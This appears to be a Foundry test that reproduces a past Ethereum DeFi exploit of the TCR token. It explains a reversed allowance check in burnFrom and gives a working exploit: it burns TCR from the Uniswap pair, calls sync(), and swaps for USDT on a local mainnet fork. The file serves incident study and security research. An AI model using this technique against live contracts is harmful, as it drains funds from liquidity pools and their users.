// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
    @KeyInfo
    - Total Lost: 639,222 $USDT
    - Attacker: https://etherscan.io/address/0xb19b7f59c08ea447f82b587c058ecbf5fde9c299
    - Attack Contract: https://etherscan.io/address/0x6653d9bcbc28fc5a2f5fb5650af8f2b2e1695a15
    - Vuln Contract: https://etherscan.io/address/0xe38b72d6595fd3885d1d2f770aa23e94757f91a1
    - Attack Tx: https://app.blocksec.com/explorer/tx/eth/0x81e9918e248d14d78ff7b697355fd9f456c6d7881486ed14fdfb69db16631154
*/

// VULNERABILITY: Incorrect allowance check direction in TcrToken.burnFrom (reversed mapping keys)
// The burnFrom implementation checks and uses _allowances[msg.sender][from] instead of the correct _allowances[from][msg.sender].
// See TcrToken.sol:155: require(_allowances[msg.sender][from] >= amount...
// and _approve(msg.sender, from, ...) which also writes the reversed key.
// Standard ERC20 semantics (and the token's own transferFrom/_allowanceTransfer) use _allowances[from][spender].
// Why it exists: developer copy-paste or indexing error when implementing burnFrom (burns "from" using allowance granted by "from").
// Impact: Any caller who has called approve(spender=ANY) on TCR can burn arbitrary amounts of TCR from ANY address (including Uniswap pair reserves)
//   by calling burnFrom(victim, amount), because their own approval sets the key that burnFrom reads.
// This is not a standard approval-for-burn; the attacker never needs the victim to approve them.

// EXPLOIT STEPS:
// 1. Attacker contract (this) seeds 0.04 ETH, approves USDT/TCR to router and crucially TCR.approve(pool, MAX) which executes _approve(attacker, pool, MAX) => _allowances[attacker][pool] = MAX (TcrToken.sol:455).
// 2. Swap WETH->USDT->TCR via router to acquire attackerTCRbalance (line ~79).
// 3. Query poolTCRbalance = TCR.balanceOf(pool), then TCR.burnFrom(pool, poolTCRbalance - 1e8) (line 81).
//    Inside burnFrom: msg.sender=attacker, from=pool => require(_allowances[attacker][pool] >= amt) passes (the key set in step 1).
//    Then _burn(pool, amt) which does _balances[pool] -= amt; totalSupply -= amt (TcrToken.sol:477).
//    Result: Uniswap pair TCR balance drops dramatically while USDT balance unchanged; k invariant broken.
// 4. Call pair.sync() (line 83) => forces reserves = current balances (UniswapV2Pair.sol:502), now TCR reserve << USDT reserve.
// 5. Swap attacker's TCR for USDT (line 86): router computes huge output USDT because TCR is artificially scarce in the pair. Profit extracted.
// 6. (In real attack) ~639k USDT drained.

interface IUSDTInterface {
    function approve(address spender, uint256 value) external;
}

interface ITcrInterface {
    function burnFrom(address from, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
}

interface IUNIswapV2 {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPairPoolInterface {
    function sync() external;
}

contract ExploitTest is Test {
    address TCR = 0xE38B72d6595FD3885d1D2F770aa23E94757F91a1;
    address usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address route = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address pool = 0x420725A69E79EEffB000F98Ccd78a52369b6C5d4;
    uint256 constant MAX = type(uint256).max;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8545", 14_139_082 - 1);
        cheats.label(address(usdt), "USDT");
        cheats.label(address(TCR), "TCR");
        cheats.label(address(route), "UniswapRoute");
        cheats.label(address(weth), "WETH");
        cheats.label(address(pool), "PairPool");
        deal(address(this), 0.04 ether);
    }

    function testExploit() external {
        IUSDTInterface(usdt).approve(route, type(uint256).max);
        ITcrInterface(TCR).approve(route, type(uint256).max);
        // VULNERABILITY TRIGGER: This approve sets the REVERSED allowance that the buggy burnFrom will read.
        // TCR.approve(pool, MAX) => TcrToken._approve(msg.sender=attacker, spender=pool, amt) => _allowances[attacker][pool] = MAX
        // (see TcrToken.sol:455 and the reversed check at burnFrom:155)
        ITcrInterface(TCR).approve(pool, type(uint256).max);

        emit log_named_decimal_uint(
            "Exploiter USDT balance before attack", IERC20(usdt).balanceOf(address(this)), IERC20(usdt).decimals()
        );
        uint256 wethAmount = address(this).balance;
        address[] memory path = new address[](3);
        path[0] = weth;
        path[1] = usdt;
        path[2] = TCR;
        uint256 deadline = block.timestamp + 24 hours;

        IUNIswapV2(route).swapExactETHForTokens{value: wethAmount}(1, path, address(this), deadline);
        uint256 poolTCRbalance = IERC20(TCR).balanceOf(pool);
        // CRITICAL EXPLOIT CALL: burn TCR directly out of the Uniswap pair's token balance (not via LP burn).
        // Because of the reversed allowance, no approval from the pool was needed.
        ITcrInterface(TCR).burnFrom(pool, poolTCRbalance - 100_000_000);
        uint256 attackerTCRbalance = IERC20(TCR).balanceOf(address(this));
        // sync() updates the pair's internal reserves to the post-burn balances (TCR now tiny).
        // Without this, the router swap would still use stale (pre-burn) reserves.
        IPairPoolInterface(pool).sync();
        address[] memory path2 = new address[](2);
        path2[0] = TCR;
        path2[1] = usdt;
        IUNIswapV2(route).swapExactTokensForTokens(attackerTCRbalance, 1, path2, address(this), deadline);

        emit log_named_decimal_uint(
            "Exploiter USDT balance after attack", IERC20(usdt).balanceOf(address(this)), IERC20(usdt).decimals()
        );
    }
}
